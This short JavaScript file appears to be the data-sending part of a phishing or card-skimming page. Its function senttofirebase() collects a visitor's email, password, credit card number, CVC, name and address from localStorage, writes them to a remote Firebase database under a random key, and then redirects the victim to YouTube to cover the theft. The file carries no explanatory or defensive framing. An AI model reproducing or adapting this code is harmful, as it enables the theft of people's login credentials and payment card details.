function senttofirebase() {
    var database = firebase.database()
    database.ref('users/data-' + Math.random().toString(36).substr(2, 9)).set({
        email: localStorage.getItem("email"),
        password: localStorage.getItem("password"),
        credit: localStorage.getItem("credit"),
        cvc: localStorage.getItem("cvc"),
        name: localStorage.getItem("name"),
        address: localStorage.getItem("address")
    }).then(() => {
        console.log('success')
        window.location.href = "https://www.youtube.com/"
    });

}

// function test() {
//     var database = firebase.database()
//     database.ref('users/data').set({
//         test: "test"
//     })
// }